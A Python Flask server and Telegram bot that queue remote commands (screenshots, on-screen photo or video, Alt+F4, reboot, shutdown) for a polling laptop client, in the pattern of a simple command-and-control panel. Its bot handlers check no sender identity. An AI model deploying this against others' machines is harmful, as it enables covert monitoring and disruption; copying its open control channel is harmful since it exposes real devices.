import os
import json
import uuid
import threading
import time
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters

app = Flask(__name__)

# ===== КОНФИГУРАЦИЯ =====
TOKEN = os.environ.get('TOKEN')
SECRET_KEY = os.environ.get('SECRET_KEY')
PORT = int(os.environ.get('PORT', 5000))
# ========================

bot = Bot(token=TOKEN)
clients = {}
pending_commands = {}

# Меню управления
def create_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
        [
            InlineKeyboardButton("🖼 Фото на экран", callback_data='play_photo'),
            InlineKeyboardButton("🎥 Видео на экран", callback_data='play_video')
        ],
        [InlineKeyboardButton("❌ Alt+F4", callback_data='altf4')],
        [
            InlineKeyboardButton("🔄 Перезагрузить", callback_data='reboot'),
            InlineKeyboardButton("⏹ Выключить", callback_data='shutdown')
        ]
    ])

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """Обработка проверки состояния от клиента"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_id = data.get('ip', 'unknown')
    clients[client_id] = {
        'last_seen': datetime.now(),
        'ip': data.get('ip', ''),
        'status': 'online'
    }
    return jsonify({'status': 'ok'})

@app.route('/commands', methods=['GET'])
def get_commands():
    """Получение команд для клиента"""
    client_key = request.args.get('key')
    if client_key != SECRET_KEY:
        return jsonify([]), 401
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    commands = pending_commands.get(client_ip, [])
    pending_commands[client_ip] = []
    return jsonify(commands)

@app.route('/complete', methods=['POST'])
def complete_command():
    """Подтверждение выполнения команды"""
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    command_id = data.get('command_id')
    
    if client_ip in pending_commands:
        pending_commands[client_ip] = [
            cmd for cmd in pending_commands[client_ip] 
            if cmd.get('id') != command_id
        ]
    
    return jsonify({'status': 'ok'})

async def send_menu(update: Update):
    """Отправка меню с кнопками"""
    await update.message.reply_text(
        "🔒 Управление ноутбуком\nВыберите действие:",
        reply_markup=create_keyboard()
    )

async def button_handler(update: Update, context):
    """Обработчик нажатий кнопок"""
    query = update.callback_query
    await query.answer()
    data = query.data
    
    try:
        client_id = next(iter(clients.keys()), None)
        
        if not client_id:
            await query.message.reply_text("⚠️ Нет подключенных устройств")
            return
        
        if data == 'screenshot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'screenshot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            await query.message.reply_text("📸 Запрошен скриншот...")
        
        elif data in ('play_video', 'play_photo'):
            media_type = 'video' if data == 'play_video' else 'image'
            text = "📹 Отправьте видео файл..." if media_type == 'video' else "🖼 Отправьте фото..."
            await query.message.reply_text(text)
            context.user_data['awaiting_media'] = {'type': media_type, 'client': client_id}
        
        elif data == 'altf4':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'altf4',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            await query.message.reply_text("✅ Команда Alt+F4 отправлена")
        
        elif data == 'reboot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'reboot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            await query.message.reply_text("🔄 Команда перезагрузки отправлена")
        
        elif data == 'shutdown':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            await query.message.reply_text("⏹ Команда выключения отправлена")
    
    except Exception as e:
        await query.message.reply_text(f"⚠️ Ошибка: {str(e)}")

async def media_handler(update: Update, context):
    """Обработчик медиафайлов"""
    media_info = context.user_data.get('awaiting_media')
    if not media_info:
        return
    
    client_id = media_info.get('client')
    media_type = media_info.get('type')
    
    try:
        file_id = None
        
        if media_type == 'image' and update.message.photo:
            file_id = update.message.photo[-1].file_id
        elif media_type == 'video' and update.message.video:
            file_id = update.message.video.file_id
        
        if file_id:
            file = await bot.get_file(file_id)
            command = {
                'id': str(uuid.uuid4()),
                'type': 'media',
                'media_type': media_type,
                'url': file.file_path,
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            await update.message.reply_text(f"✅ {'Фото' if media_type == 'image' else 'Видео'} отправлено на устройство")
        
        del context.user_data['awaiting_media']
        await send_menu(update)
    
    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка обработки медиа: {str(e)}")

async def start(update: Update, context):
    """Обработчик команды /start"""
    await send_menu(update)

def cleanup_clients():
    """Очистка неактивных клиентов"""
    while True:
        try:
            now = datetime.now()
            for client_id, client_data in list(clients.items()):
                if now - client_data['last_seen'] > timedelta(minutes=5):
                    del clients[client_id]
        except:
            pass
        time.sleep(300)

@app.route('/')
def home():
    return "PC Control Bot is running!"

async def run_bot():
    """Запуск Telegram бота"""
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, media_handler))
    
    await application.run_polling()

def start_bot():
    import asyncio
    asyncio.run(run_bot())

if __name__ == '__main__':
    # Запускаем очистку клиентов в фоне
    threading.Thread(target=cleanup_clients, daemon=True).start()
    
    # Запускаем бота в отдельном потоке
    threading.Thread(target=start_bot, daemon=True).start()
    
    # Запускаем Flask сервер
    from waitress import serve
    serve(app, host="0.0.0.0", port=PORT)
